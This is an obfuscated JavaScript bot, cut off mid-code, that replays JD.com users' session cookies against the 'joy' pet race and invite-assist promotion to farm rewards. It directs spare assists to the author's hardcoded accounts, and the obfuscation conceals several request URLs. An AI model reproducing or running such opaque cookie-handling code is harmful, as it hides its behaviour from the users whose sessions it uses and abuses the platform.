ClMKm6Kyn5rOu5aa86Le6','wqF3w6w6w5g=','I8OUw7UGw6s=','E8OOw5Uuw60=','w7PChhAFwro=','w7nDnAITFw==','L8K8UcOQw53Cjww+HQ==','WBLDvXwyIgx5HQHCtmhAw4Quwrd+e8OnAsKDVsKhUxd6w73DoEB4w5BENA3CkGdcw67DpTIQVztaLgl5wpJVw5N7w4jDicKsAl5Vw7PDqsOjw5UMwoB4Y8Ocw6xHAg==','wrTDmcORU8K2L8Kfw6nDgSkBJMOfw6fCuGARYHcYwolwEMKdwqfCoMK4wovCg8KDw7lZw4DCgMKGNMOPKQDCvw==','IEsHAcOo','wpBZBxbClg==','wrk2w6zDolU=','CcOUdsOMwqU=','HMKqw6HCu3M=','w6TDisOYS8KBIcKew74=','wqvCvy8=','w49YTSUnw4U=','w5TDmmEIwq0kUcK1RA==','D8Ksw6zCnHQ=','w6DDuV8CwqQ=','G8KTw58sw7PDusKTwo7CgBQ=','wrbCjsOoworCmj85w73CvcKJ','w7TDmcOdR8KLJMK6w7LDjD8=','GhEbwoTCvg==','QcO/wpV1wpTDlH1EwoLCgA==','HOWEreaMm+S8rcKi','LTphLsKpUA==','5Li95aSL5Y+35L+q5pyN6L2E6KGQ6YOg6K6y5YuO5Yqnwpc=','VsOkwq51woA=','w4DDi2cFwqI3WQ==','w6bDhyUGHw==','E8KCe8O0','w7DDiE5F','wqTCtQtxRA==','w5fCs8OawqzDuA==','ey/CrA==','wrZFwqJF','6K275Yqf6Zm25oaC5Zy9w7HDk2xfwqXovrnlhaHmo5Tkv5fml4HlhbzlraRN5bie6K6I6YGr6Lyg6Ie55p+c5Y666I+Z5Y6DwpU4JsKfLhI=','w6vCqMKGwrPDiQ==','w7cObcOUw64D','wofCojlkfg==','wpNGKyLCnQ==','w6LDgVJeJw==','a8O7wrF+wo0=','w7DDqsKvwrjCvRU=','w7HDp8Kowr/Ctw==','w5YVB8KrBQ==','OxliM8KK','B8OWw64Tw40rd8Kaw7DDmg==','woXCkA5pXw==','w5zChMOVwqnDqQ==','JBrCicOXwqU=','O8KuwpcAbg==','w7XDjsOAZMKXKcKPw7XDhhxVIsKZw7vDqw==','wplDIyLCmhFEwrMTTA==','Lw3CosO+wq4=','DsKGw5gOFSI=','5Lq15aW35Y+f5Ly45p2u6L+m6KC96YK96K6q5YuU5Yuawow=','wqgEwrLDgsOO','QgoT','V1MTLOitseaxjuWmtei2vA==','wqPCiMOzwobCmjwAw7LCqg==','YhhYFA7DtnIFIQ==','PiEswr7Cgn5lQcOtw7tswrUwGsOM','wphUPhPCnRhSwogOUMK1MWDCtsOQw4DCuQ==','w7PDm8OETsKMI8KLw6/DiyNSY8KAwrLCvmA=','wrY9B8Kzw4U=','wrcPwq/DsHk=','wq7Cghc=','TjUGsjAiamiexG.cNDom.v6wPwERtH=='];(function(_0x7f0385,_0x124276,_0x170d5c){var _0x383d5f=function(_0x4631ab,_0x58a6a2,_0x12be2e,_0x58dc79,_0xe6876){_0x58a6a2=_0x58a6a2>>0x8,_0xe6876='po';var _0x354c0f='shift',_0x178ba0='push';if(_0x58a6a2<_0x4631ab){while(--_0x4631ab){_0x58dc79=_0x7f0385[_0x354c0f]();if(_0x58a6a2===_0x4631ab){_0x58a6a2=_0x58dc79;_0x12be2e=_0x7f0385[_0xe6876+'p']();}else if(_0x58a6a2&&_0x12be2e['replace'](/[TUGAexGNDwPwERtH=]/g,'')===_0x58a6a2){_0x7f0385[_0x178ba0](_0x58dc79);}}_0x7f0385[_0x178ba0](_0x7f0385[_0x354c0f]());}return 0x99162;};return _0x383d5f(++_0x124276,_0x170d5c)>>_0x124276^_0x170d5c;}(_0x59a1,0x1de,0x1de00));var _0x1235=function(_0x4f51b7,_0x25b70f){_0x4f51b7=~~'0x'['concat'](_0x4f51b7);var _0x240e22=_0x59a1[_0x4f51b7];if(_0x1235['xiqjxs']===undefined){(function(){var _0x4ef5db=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x216f86='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4ef5db['atob']||(_0x4ef5db['atob']=function(_0x4aa866){var _0xfa076=String(_0x4aa866)['replace'](/=+$/,'');for(var _0x37931d=0x0,_0x575b82,_0xe12d94,_0x4fefa8=0x0,_0x1ce41f='';_0xe12d94=_0xfa076['charAt'](_0x4fefa8++);~_0xe12d94&&(_0x575b82=_0x37931d%0x4?_0x575b82*0x40+_0xe12d94:_0xe12d94,_0x37931d++%0x4)?_0x1ce41f+=String['fromCharCode'](0xff&_0x575b82>>(-0x2*_0x37931d&0x6)):0x0){_0xe12d94=_0x216f86['indexOf'](_0xe12d94);}return _0x1ce41f;});}());var _0x573939=function(_0x5e9df2,_0x25b70f){var _0x35eabe=[],_0x1dc3ed=0x0,_0x1d029d,_0x752292='',_0x11e156='';_0x5e9df2=atob(_0x5e9df2);for(var _0x5cb515=0x0,_0xbfb8c6=_0x5e9df2['length'];_0x5cb515<_0xbfb8c6;_0x5cb515++){_0x11e156+='%'+('00'+_0x5e9df2['charCodeAt'](_0x5cb515)['toString'](0x10))['slice'](-0x2);}_0x5e9df2=decodeURIComponent(_0x11e156);for(var _0x14f3b5=0x0;_0x14f3b5<0x100;_0x14f3b5++){_0x35eabe[_0x14f3b5]=_0x14f3b5;}for(_0x14f3b5=0x0;_0x14f3b5<0x100;_0x14f3b5++){_0x1dc3ed=(_0x1dc3ed+_0x35eabe[_0x14f3b5]+_0x25b70f['charCodeAt'](_0x14f3b5%_0x25b70f['length']))%0x100;_0x1d029d=_0x35eabe[_0x14f3b5];_0x35eabe[_0x14f3b5]=_0x35eabe[_0x1dc3ed];_0x35eabe[_0x1dc3ed]=_0x1d029d;}_0x14f3b5=0x0;_0x1dc3ed=0x0;for(var _0x53c9b9=0x0;_0x53c9b9<_0x5e9df2['length'];_0x53c9b9++){_0x14f3b5=(_0x14f3b5+0x1)%0x100;_0x1dc3ed=(_0x1dc3ed+_0x35eabe[_0x14f3b5])%0x100;_0x1d029d=_0x35eabe[_0x14f3b5];_0x35eabe[_0x14f3b5]=_0x35eabe[_0x1dc3ed];_0x35eabe[_0x1dc3ed]=_0x1d029d;_0x752292+=String['fromCharCode'](_0x5e9df2['charCodeAt'](_0x53c9b9)^_0x35eabe[(_0x35eabe[_0x14f3b5]+_0x35eabe[_0x1dc3ed])%0x100]);}return _0x752292;};_0x1235['hSbwda']=_0x573939;_0x1235['kkAWwc']={};_0x1235['xiqjxs']=!![];}var _0x58dda0=_0x1235['kkAWwc'][_0x4f51b7];if(_0x58dda0===undefined){if(_0x1235['IlPVCq']===undefined){_0x1235['IlPVCq']=!![];}_0x240e22=_0x1235['hSbwda'](_0x240e22,_0x25b70f);_0x1235['kkAWwc'][_0x4f51b7]=_0x240e22;}else{_0x240e22=_0x58dda0;}return _0x240e22;};const isRequest=typeof $request!=_0x1235('0','989M');const JD_BASE_API='https://draw.jdfcloud.com//pet';let invite_pins=['5141779-21548625,jd_nlGJfCMVydhw'];let run_pins=['5141779-21548625,jd_nlGJfCMVydhw'];let friendsArr=['5141779-21548625',_0x1235('1','b27O')];let cookiesArr=[],cookie='';let nowTimes=new Date(new Date()['getTime']()+new Date()[_0x1235('2','9ocf')]()*0x3c*0x3e8+0x8*0x3c*0x3c*0x3e8);const headers={'Connection':'keep-alive','Accept-Encoding':'gzip,\x20deflate,\x20br','App-Id':'','Lottery-Access-Signature':'','Content-Type':_0x1235('3','s1&l'),'reqSource':_0x1235('4','kFu2'),'User-Agent':'Mozilla/5.0\x20(iPhone;\x20CPU\x20iPhone\x20OS\x2013_2_3\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Version/13.0.3\x20Mobile/15E148\x20Safari/604.1','Cookie':'','openId':'','Host':'draw.jdfcloud.com','Referer':'https://servicewechat.com/wxccb5c536b0ecd1bf/633/page-frame.html','Accept-Language':_0x1235('5','8kX#'),'Accept':_0x1235('6','Q6y*'),'LKYLToken':''};if($[_0x1235('7','AlM2')]()){Object['keys'](jdCookieNode)[_0x1235('8','Q6y*')](_0xb956b2=>{cookiesArr[_0x1235('9','MM%a')](jdCookieNode[_0xb956b2]);});}else{var oTTifZ=_0x1235('a','fMn]')[_0x1235('b','qNM1')]('|'),kmFAtn=0x0;while(!![]){switch(oTTifZ[kmFAtn++]){case'0':if($['getdata'](_0x1235('c','&xWG'))){if(invite_pins[_0x1235('d','kFu2')]>0x0){invite_pins[_0x1235('e','zUDq')]($[_0x1235('f','2sFc')]('jd2_joy_invite_pin'));}else{invite_pins=[];invite_pins[_0x1235('10','UGN$')]($[_0x1235('11','MM%a')](_0x1235('12',')Nqh')));}}continue;case'1':cookiesArr=[$[_0x1235('13','QjOz')]('CookieJD'),$[_0x1235('14','LBLt')](_0x1235('15','b27O')),...jsonParse($[_0x1235('16','!n#]')](_0x1235('17','C)]('))||'[]')[_0x1235('18','kFu2')](_0x1e9608=>_0x1e9608[_0x1235('19','qNM1')])]['filter'](_0x34dc74=>!!_0x34dc74);continue;case'2':if($[_0x1235('1a','AlM2')](_0x1235('1b','AlM2'))){run_pins=[];run_pins[_0x1235('1c','yqe!')]($[_0x1235('1d','989M')]('jd_joy_run_pin'));}continue;case'3':if($['getdata'](_0x1235('1e','8kX#'))){if(run_pins['length']>0x0){run_pins['push']($[_0x1235('1f','DVjE')](_0x1235('20','jW!j')));}else{run_pins=[];run_pins[_0x1235('21','T8Rj')]($[_0x1235('14','LBLt')](_0x1235('22','AlM2')));}}continue;case'4':if($[_0x1235('23','8kji')](_0x1235('24','2sFc'))){invite_pins=[];invite_pins[_0x1235('25','NW37')]($[_0x1235('26','FgMD')]('jd_joy_invite_pin'));}continue;}break;}}async function main(){var _0x552407={'bHkCl':_0x1235('27','qNM1'),'FjmFD':'code','OtCDO':function(_0x54b517,_0x49438b){return _0x54b517!==_0x49438b;},'CYTpE':_0x1235('28','Al2h'),'AsdVj':_0x1235('29',')M8m'),'EnQfo':_0x1235('2a','ZN3c'),'PrJKF':'uwESP','FgzHC':function(_0x299af4,_0x464442){return _0x299af4<_0x464442;},'nBiHh':_0x1235('2b','!n#]'),'fZRAU':function(_0x528bcd,_0x1ff4e5){return _0x528bcd(_0x1ff4e5);},'PeXXF':function(_0xb500d2,_0x4730bd){return _0xb500d2+_0x4730bd;},'TMdMg':function(_0x2cb87c,_0x3e0851){return _0x2cb87c>_0x3e0851;},'KPTwt':function(_0xfb996f,_0x64dfa){return _0xfb996f-_0x64dfa;},'NDtvt':function(_0x5337b2,_0x48e2d1,_0x510180){return _0x5337b2(_0x48e2d1,_0x510180);},'GMDEq':function(_0x554e44,_0x113740){return _0x554e44>=_0x113740;},'YCiDJ':function(_0x3fb5fb,_0x72c249){return _0x3fb5fb(_0x72c249);},'jkZrT':function(_0x5a5526,_0x51844a){return _0x5a5526>_0x51844a;},'YDAhT':function(_0x2a4ea3,_0x29cb22){return _0x2a4ea3-_0x29cb22;},'xsoBn':function(_0x3a502d,_0x190889){return _0x3a502d(_0x190889);},'WIPhI':_0x1235('2c','989M'),'iDNRT':function(_0x253c5c){return _0x253c5c();}};if(!cookiesArr[0x0]){if(_0x552407[_0x1235('2d','A62r')](_0x552407[_0x1235('2e','$L*u')],_0x552407['CYTpE'])){$[_0x1235('2f','sD^W')]($[_0x1235('30','Q6y*')],_0x552407['bHkCl'],'https://bean.m.jd.com/bean/signIndex.action',{'open-url':'https://bean.m.jd.com/bean/signIndex.action'});return;}else{$[_0x1235('31','QjOz')]($[_0x1235('32','UGN$')],_0x552407[_0x1235('33','T8Rj')],_0x552407[_0x1235('34','CJJx')],{'open-url':_0x1235('35','Q6y*')});return;}}await readToken();console['log'](_0x1235('36','QjOz')+($['LKYLToken']?$[_0x1235('37','zUDq')]:_0x552407[_0x1235('38','$L*u')])+'\x0a');if(!$[_0x1235('39','kFu2')]){if(_0x552407['OtCDO'](_0x552407[_0x1235('3a','SzJ#')],_0x552407[_0x1235('3b','FgMD')])){resolve(data);}else{$[_0x1235('3c','DVjE')]($['name'],_0x1235('3d','ZN3c'),'iOS用户微信搜索\x27来客有礼\x27小程序\x0a点击底部的\x27发现\x27Tab\x0a即可获取Token');}}await getFriendPins();for(let _0x4e9b05=0x0;_0x552407[_0x1235('3e','zW^G')](_0x4e9b05,cookiesArr[_0x1235('3f','8kX#')]);_0x4e9b05++){if(cookiesArr[_0x4e9b05]){$[_0x1235('40','feH(')]='';if($['isNode']()){if(process[_0x1235('41','qNM1')][_0x1235('42','!n#]')]){console[_0x1235('43','jW!j')]('\x0a赛跑会先给账号内部助力,如您当前账户有剩下助力机会则为lx0301作者助力\x0a');let _0x111940=[];Object['values'](jdCookieNode)['filter'](_0x3768d6=>_0x3768d6[_0x1235('44','zUDq')](/pt_pin=([^; ]+)(?=;?)/))[_0x1235('45','SzJ#')](_0x450b84=>_0x111940[_0x1235('1c','yqe!')](decodeURIComponent(_0x450b84[_0x1235('46','d(zg')](/pt_pin=([^; ]+)(?=;?)/)[0x1])));run_pins=[...new Set(_0x111940),[...getRandomArrayElements([...run_pins[0x0]['split'](',')],[...run_pins[0x0][_0x1235('47','kFu2')](',')][_0x1235('48','AlM2')])]];run_pins=[[...run_pins][_0x1235('49','PBi@')](',')];invite_pins=run_pins;}else{console['log'](_0x1235('4a','qNM1'));run_pins=run_pins[0x0][_0x1235('4b','CJJx')](',');run_pins=[...new Set(run_pins)];let _0x4c8de0=run_pins[_0x1235('4c','bBuq')](run_pins[_0x1235('4d','LBLt')](_0x1235('4e','8kX#')),0x1);_0x4c8de0[_0x1235('4f','Al2h')](...run_pins[_0x1235('50','&xWG')](run_pins['indexOf'](_0x552407[_0x1235('51','b27O')]),0x1));const _0x4b34f8=getRandomArrayElements(run_pins,run_pins['length']);run_pins=[[..._0x4c8de0,..._0x4b34f8][_0x1235('52','5Xgv')](',')];invite_pins=run_pins;}}cookie=cookiesArr[_0x4e9b05];UserName=_0x552407['fZRAU'](decodeURIComponent,cookie[_0x1235('53','bBuq')](/pt_pin=([^; ]+)(?=;?)/)&&cookie[_0x1235('54','sD^W')](/pt_pin=([^; ]+)(?=;?)/)[0x1]);$[_0x1235('55','T8Rj')]=_0x552407[_0x1235('56','989M')](_0x4e9b05,0x1);$[_0x1235('57','ERAq')]=0x0;$[_0x1235('58',')M8m')]=0x0;console[_0x1235('59','CJJx')]('\x0a开始【京东账号'+$[_0x1235('5a','feH(')]+'】'+UserName+'\x0a');$[_0x1235('5b','UGN$')]=!![];$[_0x1235('5c','2sFc')]=!![];console[_0x1235('5d','NW37')](_0x1235('5e','fgyc'));const _0x5614f9=_0x552407[_0x1235('5f','8kX#')]($[_0x1235('60','CJJx')],invite_pins[_0x1235('61','CJJx')])?_0x552407[_0x1235('62','Q6y*')](invite_pins[_0x1235('63','UGN$')],0x1):$[_0x1235('64','NW37')]-0x1;let _0x414955=invite_pins[_0x5614f9][_0x1235('65','SzJ#')](',');_0x414955=[..._0x414955,..._0x552407[_0x1235('66','SzJ#')](getRandomArrayElements,friendsArr,_0x552407[_0x1235('67','sD^W')](friendsArr[_0x1235('68','py[V')],0x12)?0x12:friendsArr[_0x1235('48','AlM2')])];await _0x552407[_0x1235('69','SzJ#')](invite,_0x414955);if($[_0x1235('6a','A62r')]&&$['LKYLLogin']){if(_0x552407['GMDEq'](nowTimes['getHours'](),0x9)&&nowTimes[_0x1235('6b','s1&l')]()<0x15){console['log'](_0x1235('6c','ERAq'));const _0xa7eede=_0x552407[_0x1235('6d','DVjE')]($[_0x1235('6e','ZN3c')],run_pins[_0x1235('6f','fMn]')])?_0x552407['YDAhT'](run_pins[_0x1235('d','kFu2')],0x1):_0x552407['YDAhT']($[_0x1235('70','!n#]')],0x1);let _0x1a9e43=run_pins[_0xa7eede][_0x1235('71','LBLt')](',');await _0x552407[_0x1235('72','A62r')](run,_0x1a9e43);}else{if(_0x552407[_0x1235('73','py[V')]===_0x1235('74','5Xgv')){console[_0x1235('75','MM%a')](_0x1235('76','jW!j'));}else{data=JSON[_0x1235('77','8kji')](data);if(data&&data[_0x1235('48','AlM2')]>0x0){$['LKYLToken']=data[0x0][_0x552407['FjmFD']];}}}}await _0x552407[_0x1235('78',')Nqh')](showMsg);}}$[_0x1235('79','QjOz')]();}function readToken(){var _0x393e82={'bjKsk':function(_0x48c84b,_0x50c295){return _0x48c84b===_0x50c295;},'wyNGM':function(_0x4c1cdc,_0x1a1326){return _0x4c1cdc>_0x1a1326;},'yCupi':'friendsArr'};return new Promise(_0x941318=>{var _0x172550={'gLYVw':_0x393e82[_0x1235('7a','zUDq')]};$['get']({'url':_0x1235('7b','sD^W'),'timeout':0x2710},(_0x115fed,_0x3f4081,_0x41f230)=>{try{if(_0x115fed){console[_0x1235('7c','C)](')](''+JSON[_0x1235('7d','jW!j')](_0x115fed));console[_0x1235('59','CJJx')]($['name']+'\x20API请求失败，请检查网路重试');}else{if(_0x41f230){if(_0x393e82[_0x1235('7e','[8qn')]('hYfQw',_0x1235('7f','fgyc'))){_0x41f230=JSON['parse'](_0x41f230);if(_0x41f230&&_0x393e82[_0x1235('80','TNFl')](_0x41f230[_0x1235('81','&xWG')],0x0)){if(_0x393e82[_0x1235('82','ERAq')]('uCEnf',_0x1235('83','jW!j'))){$[_0x1235('84','CJJx')]=_0x41f230[0x0][_0x1235('85','TNFl')];}else{friendsArr=$[_0x1235('86','sD^W')][_0x172550[_0x1235('87','UGN$')]];console[_0x1235('88','2sFc')](_0x1235('89','!n#]')+friendsArr['length']+'个好友供来进行邀请助力\x0a');}}}else{_0x41f230=JSON[_0x1235('8a','feH(')](_0x41f230);}}}}catch(_0x100558){$['logErr'](_0x100558,_0x3f4081);}finally{_0x941318(_0x41f230);}});});}function showMsg(){var _0x30db40={'hSHcV':_0x1235('8b','kEvR'),'GRUmu':function(_0x51b370,_0x438807){return _0x51b370===_0x438807;},'XZcnO':_0x1235('8c','b27O'),'ivErt':_0x1235('8d','fMn]'),'oNzDq':function(_0x3e9623,_0x228622){return _0x3e9623===_0x228622;},'JuXur':_0x1235('8e','T8Rj'),'nivqd':function(_0x27405e,_0x3d4193){return _0x27405e>_0x3d4193;},'sznEK':_0x1235('8f','T8Rj'),'URbUV':_0x1235('90','2sFc'),'laQyY':function(_0x85606f,_0x2f08da){return _0x85606f/_0x2f08da;},'oDpik':function(_0x5d1bee,_0x2d4fc1){return _0x5d1bee!==_0x2d4fc1;},'WZHkW':'RfNoI','bgfMH':'sdSVW','huaQv':function(_0xae58f9){return _0xae58f9();}};return new Promise(async _0x459e1b=>{if(_0x30db40[_0x1235('91','T8Rj')](_0x30db40[_0x1235('92','CJJx')],_0x1235('93','TNFl'))){$[_0x1235('94','py[V')](_0x30db40[_0x1235('95','UGN$')]);$[_0x1235('96','8kji')](JSON['stringify'](err));}else{if($[_0x1235('97','SzJ#')]||$['runReward']){let _0x400eea='';if(_0x30db40[_0x1235('98','AlM2')]($['inviteReward'],0x0)){if(_0x30db40[_0x1235('99','LBLt')](_0x30db40[_0x1235('9a','DVjE')],_0x30db40['URbUV'])){if(err){$['log'](_0x1235('9b','FgMD'));$[_0x1235('9c','!n#]')](JSON[_0x1235('9d','unAi')](err));}else{$['log'](_0x1235('9e','CJJx')+data);data=JSON[_0x1235('9f','%^Dk')](data);if(data[_0x1235('a0','AlM2')]&&_0x30db40['GRUmu'](data[_0x1235('a1','unAi')],_0x30db40['XZcnO'])){$['inviteReward']+=0x1e;}}}else{_0x400eea+='给'+_0x30db40[_0x1235('a2','T8Rj')]($['inviteReward'],0x1e)+_0x1235('a3','bBuq')+$['inviteReward']+_0x1235('a4','%^Dk');}}if(_0x30db40[_0x1235('a5','HyjP')]($[_0x1235('a6','[8qn')],0x0)){if(_0x30db40[_0x1235('a7','QjOz')](_0x30db40[_0x1235('a8','LBLt')],_0x30db40[_0x1235('a9','fMn]')])){_0x400eea+='给'+$[_0x1235('aa','MM%a')]/0x5+_0x1235('ab','PBi@')+$[_0x1235('ac','ZN3c')]+'g';}else{if(typeof str==_0x30db40[_0x1235('ad','C)](')]){try{return JSON[_0x1235('ae','kEvR')](str);}catch(_0x5b5269){console[_0x1235('af','LBLt')](_0x5b5269);$[_0x1235('b0','bBuq')]($[_0x1235('b1','fgyc')],'',_0x1235('b2','d(zg'));return[];}}}}if(_0x400eea){$[_0x1235('b3','kFu2')]($['name'],'','京东账号'+$[_0x1235('b4','MM%a')]+'\x20'+UserName+'\x0a'+_0x400eea);}}_0x30db40['huaQv'](_0x459e1b);}});}async function invite(_0x20901d){var _0xadaee9={'GyNiF':_0x1235('b5','fgyc'),'gKhro':function(_0x132e75,_0x84510b){return _0x132e75===_0x84510b;},'tuIfi':'help_ok','oOXOJ':_0x1235('b6','zW^G'),'CizQN':function(_0x2fe392,_0x4c15dd){return _0x2fe392(_0x4c15dd);},'pukYM':function(_0xae0901,_0x8ae532){return _0xae0901===_0x8ae532;},'qWsVC':_0x1235('b7','UGN$'),'uQQFE':function(_0x190711,_0x7a3600){return _0x190711===_0x7a3600;},'TYvni':_0x1235('b8','989M'),'SSgst':function(_0x413816,_0x2c1dbb){return _0x413816===_0x2c1dbb;},'Lwcor':_0x1235('b9','d(zg'),'fOpZM':function(_0x93cd9,_0x3bc908){return _0x93cd9===_0x3bc908;},'ZAMZX':_0x1235('ba','8kji'),'ZqESG':_0x1235('bb','989M'),'sEwED':_0x1235('bc','AlM2'),'tqTXM':_0x1235('bd','TNFl'),'PDIBS':'iOS用户微信搜索\x27来客有礼\x27小程序\x0a点击底部的\x27发现\x27Tab\x0a即可获取Token','hbJla':function(_0x57bff7,_0xeea219){return _0x57bff7===_0xeea219;},'hPKfW':_0x1235('be','jW!j'),'gYOKf':_0x1235('bf','Al2h'),'goBat':_0x1235('c0','SzJ#')};console[_0x1235('c1','A62r')]('账号'+$[_0x1235('55','T8Rj')]+'\x20['+UserName+']\x20给下面名单的人进行邀请助力\x0a'+_0x20901d[_0x1235('c2','5Xgv')](_0x10eedd=>_0x10eedd[_0x1235('c3','unAi')]())+'\x0a');for(let _0x4f676a of _0x20901d['map'](_0x4f676a=>_0x4f676a[_0x1235('c4','UGN$')]())){if(_0x1235('c5','2sFc')===_0xadaee9[_0x1235('c6','989M')]){console[_0x1235('c7','!n#]')]('\x0a账号'+$[_0x1235('c8','2sFc')]+'\x20['+UserName+_0x1235('c9','8kji')+_0x4f676a+_0x1235('ca','b27O'));if(UserName===_0x4f676a){console['log'](_0x1235('cb','py[V'));continue;}const _0x53cf3e=await _0xadaee9[_0x1235('cc','ZN3c')](enterRoom,_0x4f676a);if(_0x53cf3e){if(_0x53cf3e[_0x1235('cd','8kX#')]){const {helpStatus}=_0x53cf3e['data'];console['log']('helpStatus\x20'+helpStatus);if(_0xadaee9[_0x1235('ce','DVjE')](helpStatus,_0x1235('cf','fMn]'))){console[_0x1235('d0','DVjE')]('您的邀请助力机会已耗尽\x0a');break;}else if(helpStatus===_0xadaee9[_0x1235('d1','NW37')]){console[_0x1235('c1','A62r')]('已给该好友\x20'+_0x4f676a+_0x1235('d2','NW37'));}else if(_0xadaee9[_0x1235('d3','qNM1')](helpStatus,_0xadaee9[_0x1235('d4','qNM1')])){console[_0x1235('88','2sFc')](_0x1235('d5','%^Dk')+_0x4f676a+'\x20已经满3人给他助力了,无需您再次助力\x0a');}else if(_0xadaee9['SSgst'](helpStatus,_0xadaee9[_0x1235('d6','SzJ#')])){console[_0x1235('d7','zUDq')]('开始给好友\x20'+_0x4f676a+_0x1235('d8','&xWG'));const _0x231c27=await helpInviteFriend(_0x4f676a);if(_0xadaee9[_0x1235('d9','CJJx')](_0x231c27['errorCode'],_0xadaee9[_0x1235('da','d(zg')])&&!_0x231c27['success']){console[_0x1235('db','kEvR')](_0xadaee9[_0x1235('dc','T8Rj')]);$[_0x1235('dd','py[V')]('',_0xadaee9['sEwED']);$['msg']($[_0x1235('de','LBLt')],_0xadaee9['tqTXM'],_0xadaee9[_0x1235('df','PBi@')]);$[_0x1235('e0','zUDq')]=![];break;}else{$[_0x1235('e1','sD^W')]=!![];}}$['jdLogin']=!![];}else{if(_0xadaee9['hbJla'](_0x53cf3e['errorCode'],'B0001')){if(_0xadaee9['hbJla'](_0x1235('e2','d(zg'),_0xadaee9[_0x1235('e3','8kji')])){console[_0x1235('e4','fMn]')](_0xadaee9[_0x1235('e5','TNFl')]);$[_0x1235('e6','$L*u')]($[_0x1235('e7','C)](')],_0x1235('e8','TNFl'),_0x1235('e9','Q6y*')+$[_0x1235('6e','ZN3c')]+'\x20'+UserName+_0x1235('ea','Q6y*'),{'open-url':_0xadaee9['goBat']});$[_0x1235('eb','MM%a')]=![];break;}else{if(_0x53cf3e){_0x53cf3e=JSON[_0x1235('ec','jW!j')](_0x53cf3e);if(_0x53cf3e&&_0x53cf3e[_0x1235('ed','LBLt')]>0x0){$[_0x1235('ee','unAi')]=_0x53cf3e[0x0][_0xadaee9['GyNiF']];}}}}}}}else{$['log'](_0x1235('ef','$L*u')+data);data=JSON[_0x1235('f0','FgMD')](data);if(data['errorCode']===_0x1235('f1','sD^W')&&_0xadaee9[_0x1235('f2','CJJx')](data['data'][_0x1235('f3','Al2h')],_0xadaee9['tuIfi'])){console['log']('助力'+friendPin+_0x1235('f4','!n#]')+data[_0x1235('f5','zUDq')][_0x1235('f6','PBi@')]+'g\x0a');$[_0x1235('a6','[8qn')]+=data[_0x1235('f7','TNFl')]['rewardNum'];}}}}function enterRoom(_0x195631){var _0x12ac7f={'WVjvm':'RmWtm','AfTEK':function(_0x65f846,_0x270f7f){return _0x65f846!==_0x270f7f;},'FnWvU':_0x1235('f8','LBLt'),'yNFWx':'UhxaE','mkCiq':function(_0x1d09ca,_0x25e874){return _0x1d09ca(_0x25e874);},'Zywfb':_0x1235('f9','HyjP'),'gwOYq':'application/json','KMjRJ':function(_0x297290,_0x58b58e){return _0x297290+_0x58b58e;},'mEDSV':_0x1235('fa','AlM2'),'iDJUB':_0x1235('fb','8kji')};return new Promise(_0x16ddf3=>{var _0x5a9b07={'SVjGM':function(_0xf9ce55,_0x374e6e){return _0xf9ce55!==_0x374e6e;},'jMHCf':_0x12ac7f['WVjvm']};if(_0x12ac7f[_0x1235('fc','Al2h')](_0x12ac7f['FnWvU'],_0x12ac7f['yNFWx'])){headers[_0x1235('fd','&xWG')]=cookie;headers[_0x1235('fe','kEvR')]=$['LKYLToken'];headers['Content-Type']='application/json';let _0x2aa06c={'url':_0x1235('ff','5Xgv')+_0x12ac7f['mkCiq'](encodeURI,_0x195631)+_0x1235('100','zW^G')+Date[_0x1235('101','s1&l')]()+'&invokeKey=qRKHmL4sna8ZOP9F','method':_0x12ac7f['Zywfb'],'data':{},'credentials':_0x1235('102','yqe!'),'header':{'content-type':_0x12ac7f[_0x1235('103',')Nqh')]}};const _0x5152f8=_0x12ac7f['KMjRJ'](_0x12ac7f['mEDSV'],_0x12ac7f[_0x1235('104','sD^W')](taroRequest,_0x2aa06c)[_0x12ac7f[_0x1235('105','MM%a')]])+$[_0x1235('106','bBuq')];const _0x124c6c={'url':_0x5152f8,'body':'{}','headers':headers};$['post'](_0x124c6c,(_0x2e1516,_0x5a80c3,_0x1f2d83)=>{try{if(_0x5a9b07[_0x1235('107','PBi@')](_0x1235('108','UGN$'),_0x5a9b07['jMHCf'])){if(_0x2e1516){$['log']($[_0x1235('109','unAi')]+'\x20API请求失败');$[_0x1235('10a','s1&l')](JSON[_0x1235('10b','kEvR')](_0x2e1516));}else{_0x1f2d83=JSON[_0x1235('10c','Q6y*')](_0x1f2d83);}}else{cookiesArr[_0x1235('10d','DVjE')](jdCookieNode[item]);}}catch(_0x190b63){$[_0x1235('10e','py[V')](_0x190b63,_0x5a80c3);}finally{_0x16ddf3(_0x1f2d83);}});}else{return reg[_0x1235('10f','8kji')](domain);}});}function helpInviteFriend(_0x215556){var _0x2e9cc8={'iwvBA':_0x1235('110','[8qn'),'KppyU':function(_0x3f3838,_0x44644f){return _0x3f3838!==_0x44644f;},'QZWNt':function(_0x11b49a,_0x8c6973){return _0x11b49a===_0x8c6973;},'WlYHm':'UDtXL','koATv':_0x1235('111','b27O'),'vbZGb':function(_0x52a00c,_0x3d0ccc){return _0x52a00c(_0x3d0ccc);},'xLZNT':'GET','iKuEP':'include','tUQZs':function(_0x2c0e23,_0x565b52){return _0x2c0e23+_0x565b52;},'rmkXV':_0x1235('112','kEvR')};return new Promise(_0x46590b=>{var _0x44cbfd={'JEnKA':_0x1235('113','s1&l'),'GznPc':'jd2_joy_invite_pin','WZrGE':function(_0x29c54f,_0x4dca64){return _0x29c54f===_0x4dca64;},'vjkLP':_0x2e9cc8[_0x1235('114',')M8m')],'zMvdt':function(_0xb75174,_0x338c70){return _0x2e9cc8[_0x1235('115','zW^G')](_0xb75174,_0x338c70);},'MADAX':function(_0x3f8313,_0x58be84){return _0x2e9cc8[_0x1235('116','989M')](_0x3f8313,_0x58be84);},'BklPf':function(_0x4fc561,_0x54cafe){return _0x4fc561!==_0x54cafe;},'YeUUq':_0x2e9cc8['WlYHm'],'GKcHX':_0x2e9cc8['koATv'],'fHifb':function(_0x2155c4,_0x2c58d6){return _0x2e9cc8[_0x1235('117','!n#]')](_0x2155c4,_0x2c58d6);}};headers[_0x1235('118','s1&l')]=cookie;headers[_0x1235('119','fMn]')]=$[_0x1235('11a','QjOz')];let 